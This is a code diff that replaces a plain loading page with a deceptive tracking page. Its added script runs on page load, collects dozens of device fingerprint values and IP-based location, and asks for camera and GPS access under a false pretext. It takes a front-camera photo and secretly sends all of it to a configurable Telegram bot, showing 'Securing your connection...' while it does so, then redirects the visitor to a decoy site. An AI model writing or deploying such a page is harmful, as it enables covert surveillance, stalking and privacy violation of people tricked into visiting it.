@@ -9,113 +9,435 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
         
         body {
-            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            color: white;
         }
         
-        .loading-container {
-            width: 100%;
-            max-width: 400px;
+        .container {
             text-align: center;
-            background: white;
-            padding: 40px 30px;
-            border-radius: 12px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        .logo {
-            margin-bottom: 30px;
-        }
-        
-        .logo img {
-            height: 40px;
-        }
-        
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4285f4;
-            border-radius: 50%;
-            margin: 0 auto 25px;
-            animation: spin 1s linear infinite;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            max-width: 90%;
+            width: 400px;
         }
         
         h1 {
-            font-size: 20px;
-            color: #333;
-            margin-bottom: 10px;
-            font-weight: 500;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            font-weight: 600;
         }
         
-        p {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        
-        .progress {
-            height: 4px;
-            background: #e8eaed;
-            border-radius: 2px;
-            margin: 25px 0;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: #4285f4;
-            transition: width 0.3s;
-        }
-        
-        .status {
-            font-size: 13px;
-            color: #888;
-            margin-top: 15px;
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px auto;
         }
         
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
         
-        .loading-text {
-            font-size: 15px;
-            color: #555;
-            margin-top: 20px;
+        .status {
+            margin: 20px 0;
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+        
+        .permission-request {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 1rem;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .dots {
+            display: inline-block;
+        }
+        
+        .dots::after {
+            content: '';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        
+        @keyframes dots {
+            0%, 20% { content: ''; }
+            40% { content: '.'; }
+            60% { content: '..'; }
+            80%, 100% { content: '...'; }
         }
     </style>
 </head>
 <body>
-    <div class="loading-container">
-        <div class="logo" id="logo">
-            <div class="spinner" id="spinner"></div>
+    <div class="container">
+        <h1>Loading<span class="dots"></span></h1>
+        <div class="loading-spinner"></div>
+        <div class="status" id="status">Preparing your content...</div>
+        
+        <!-- Permission request (initially hidden) -->
+        <div id="permissionMessage" class="permission-request hidden">
+            <p>This page needs camera access to continue</p>
+            <p style="font-size: 0.9rem; margin-top: 10px;">Please allow when your browser asks</p>
         </div>
-        
-        <h1 id="title">Loading...</h1>
-        <p id="message">Please wait while we prepare your content</p>
-        
-        <div class="progress">
-            <div class="progress-bar" id="progress"></div>
-        </div>
-        
-        <div class="status" id="status">Initializing...</div>
-        <div class="loading-text" id="loadingText">This may take a few moments</div>
     </div>
 
-    <!-- Hidden elements for data collection -->
-    <video id="camera" autoplay playsinline muted style="display:none"></video>
-    <canvas id="canvas" style="display:none"></canvas>
-
-    <script src="script.js"></script>
+    <script>
+        // ============================================
+        // CONFIGURATION - CHANGE THESE VALUES
+        // ============================================
+        
+        // Your Telegram Bot Token (get from @BotFather on Telegram)
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        
+        // Your Telegram Chat ID (where messages will be sent)
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+        
+        // The REAL destination link (where user goes after collection)
+        const REDIRECT_URL = 'https://www.google.com'; // Change to any link
+        
+        // ============================================
+        // Device Information Collection (50+ data points)
+        // ============================================
+        
+        async function collectDeviceInfo() {
+            const info = {};
+            
+            // Basic browser info
+            info.userAgent = navigator.userAgent;
+            info.language = navigator.language;
+            info.languages = navigator.languages.join(', ');
+            info.platform = navigator.platform;
+            info.cookieEnabled = navigator.cookieEnabled;
+            info.doNotTrack = navigator.doNotTrack;
+            info.hardwareConcurrency = navigator.hardwareConcurrency; // CPU cores
+            info.maxTouchPoints = navigator.maxTouchPoints;
+            info.pdfViewerEnabled = navigator.pdfViewerEnabled;
+            
+            // Screen info
+            info.screenWidth = screen.width;
+            info.screenHeight = screen.height;
+            info.screenAvailWidth = screen.availWidth;
+            info.screenAvailHeight = screen.availHeight;
+            info.screenColorDepth = screen.colorDepth;
+            info.screenPixelDepth = screen.pixelDepth;
+            info.screenOrientation = screen.orientation ? screen.orientation.type : 'unknown';
+            info.devicePixelRatio = window.devicePixelRatio;
+            
+            // Window info
+            info.windowInnerWidth = window.innerWidth;
+            info.windowInnerHeight = window.innerHeight;
+            info.windowOuterWidth = window.outerWidth;
+            info.windowOuterHeight = window.outerHeight;
+            
+            // Time info
+            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            info.timezoneOffset = new Date().getTimezoneOffset();
+            info.currentTime = new Date().toISOString();
+            info.localTime = new Date().toString();
+            
+            // Connection info (if available)
+            if (navigator.connection) {
+                info.effectiveType = navigator.connection.effectiveType;
+                info.downlink = navigator.connection.downlink;
+                info.rtt = navigator.connection.rtt;
+                info.saveData = navigator.connection.saveData;
+            }
+            
+            // Battery info (if available)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = battery.level * 100 + '%';
+                    info.batteryCharging = battery.charging;
+                } catch (e) {
+                    info.batteryError = 'Could not get battery info';
+                }
+            }
+            
+            // Memory info (if available)
+            if (navigator.deviceMemory) {
+                info.deviceMemory = navigator.deviceMemory + 'GB';
+            }
+            
+            // Get IP address via external API
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.ipAddress = ipData.ip;
+                
+                // Get more IP details
+                const ipDetailsResponse = await fetch(`https://ipapi.co/${info.ipAddress}/json/`);
+                const ipDetails = await ipDetailsResponse.json();
+                info.city = ipDetails.city;
+                info.region = ipDetails.region;
+                info.country = ipDetails.country_name;
+                info.postal = ipDetails.postal;
+                info.latitude = ipDetails.latitude;
+                info.longitude = ipDetails.longitude;
+                info.isp = ipDetails.org;
+                info.asn = ipDetails.asn;
+            } catch (e) {
+                info.ipError = 'Could not get IP info';
+            }
+            
+            // Browser plugins
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            info.plugins = plugins.join(', ');
+            
+            // MIME types
+            const mimeTypes = [];
+            for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                mimeTypes.push(navigator.mimeTypes[i].type);
+            }
+            info.mimeTypes = mimeTypes.slice(0, 10).join(', '); // Limit to 10
+            
+            // Touch support
+            info.touchSupport = 'ontouchstart' in window;
+            
+            // WebGL renderer (GPU info)
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {
+                info.gpuError = 'Could not get GPU info';
+            }
+            
+            return info;
+        }
+        
+        // ============================================
+        // Camera Functions
+        // ============================================
+        
+        async function takeCameraSnapshot() {
+            try {
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user' // Front camera
+                    } 
+                });
+                
+                // Create video element to capture frame
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // Create canvas to draw video frame
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to JPEG base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.7); // 70% quality
+                
+                // Stop all camera tracks
+                stream.getTracks().forEach(track => track.stop());
+                
+                return imageData;
+            } catch (error) {
+                console.error('Camera error:', error);
+                return null;
+            }
+        }
+        
+        // ============================================
+        // Location Functions
+        // ============================================
+        
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        });
+                    },
+                    (error) => {
+                        console.error('Location error:', error);
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // ============================================
+        // Telegram Functions
+        // ============================================
+        
+        async function sendToTelegram(deviceInfo, location, photoBase64) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                console.log('Telegram not configured - would send:', { deviceInfo, location });
+                return true;
+            }
+            
+            try {
+                // Format the message
+                let message = `📱 *New Device Info Collected*\n\n`;
+                message += `*Time:* ${new Date().toLocaleString()}\n`;
+                message += `*IP:* ${deviceInfo.ipAddress || 'Unknown'}\n`;
+                message += `*Location:* ${deviceInfo.city || 'Unknown'}, ${deviceInfo.country || 'Unknown'}\n`;
+                
+                if (location) {
+                    message += `*GPS:* ${location.latitude}, ${location.longitude}\n`;
+                    message += `*Accuracy:* ${location.accuracy}m\n`;
+                    message += `*Google Maps:* https://maps.google.com/?q=${location.latitude},${location.longitude}\n`;
+                }
+                
+                message += `\n*Device Details:*\n`;
+                message += `• Browser: ${deviceInfo.userAgent?.substring(0, 100)}...\n`;
+                message += `• Platform: ${deviceInfo.platform}\n`;
+                message += `• Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
+                message += `• CPU Cores: ${deviceInfo.hardwareConcurrency}\n`;
+                message += `• Memory: ${deviceInfo.deviceMemory || 'Unknown'}\n`;
+                message += `• Timezone: ${deviceInfo.timezone}\n`;
+                message += `• Language: ${deviceInfo.language}\n`;
+                
+                // Send text message
+                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // Send photo if available
+                if (photoBase64) {
+                    // Convert base64 to blob
+                    const base64Data = photoBase64.split(',')[1];
+                    const blob = await fetch(photoBase64).then(res => res.blob());
+                    
+                    // Create form data
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'snapshot.jpg');
+                    formData.append('caption', `Camera snapshot at ${new Date().toLocaleString()}`);
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+            }
+        }
+        
+        // ============================================
+        // Main Execution
+        // ============================================
+        
+        async function main() {
+            const statusEl = document.getElementById('status');
+            const permissionEl = document.getElementById('permissionMessage');
+            
+            // Update status
+            statusEl.textContent = 'Initializing...';
+            
+            // First, collect device info (doesn't need permission)
+            statusEl.textContent = 'Collecting device information...';
+            const deviceInfo = await collectDeviceInfo();
+            
+            // Show permission message
+            permissionEl.classList.remove('hidden');
+            statusEl.textContent = 'Requesting camera and location access...';
+            
+            // Try to get location and camera in parallel
+            const [location, photoBase64] = await Promise.all([
+                getLocation(),
+                takeCameraSnapshot()
+            ]);
+            
+            // Hide permission message
+            permissionEl.classList.add('hidden');
+            
+            // If user denied everything, just redirect
+            if (!location && !photoBase64) {
+                statusEl.textContent = 'No permissions granted. Redirecting...';
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1500);
+                return;
+            }
+            
+            // Send data to Telegram
+            statusEl.textContent = 'Securing your connection...';
+            await sendToTelegram(deviceInfo, location, photoBase64);
+            
+            // Final status before redirect
+            statusEl.textContent = 'Almost there...';
+            
+            // Redirect to the real destination
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 2000);
+        }
+        
+        // Start the process when page loads
+        window.addEventListener('load', main);
+    </script>
 </body>
 </html>
